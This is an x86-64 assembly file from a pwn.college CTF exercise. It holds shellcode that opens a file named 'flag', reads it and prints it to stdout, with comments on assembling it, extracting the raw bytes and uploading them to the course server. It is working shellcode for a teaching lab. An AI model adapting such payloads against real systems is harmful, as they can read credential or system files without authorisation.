# build with gcc -nostdlib -static shellcode_readfile.s -o shellcode_readfile
# objdump -M intel -d shellcode-elf
# get shellcode with objcopy --dump-section .text=shellcode_readfile-raw shellcode_readfile
# int3 we can hardcoded breakpoints to help when debug
# scp shellcode_readfile-raw cse466@cse466.pwn.college:/home/ctf/read_file_shellcode

.global _start
_start:
.intel_syntax noprefix

openfile:
	lea rdi, [rip+file] # first argument is file for opening
	xor rsi, rsi # second argument is 0 to read_only
	mov rax, 2 # syscall open
	syscall
readfile:
	sub sp, 0xfff # making space in the stack?
	lea rsi, [rsp]
	mov rdi, rax
	xor rdx, rdx
	mov dx, 0xfff # size to read
	xor rax, rax
	syscall
writetostdout:
	xor rdi, rdi
	add dil, 1 # set stdout fd = 1
	mov rdx, rax
	xor rax, rax
	add al, 1
	syscall
exit:
	xor rax, rax
	add al, 60
	syscall
file:
	.string "flag"
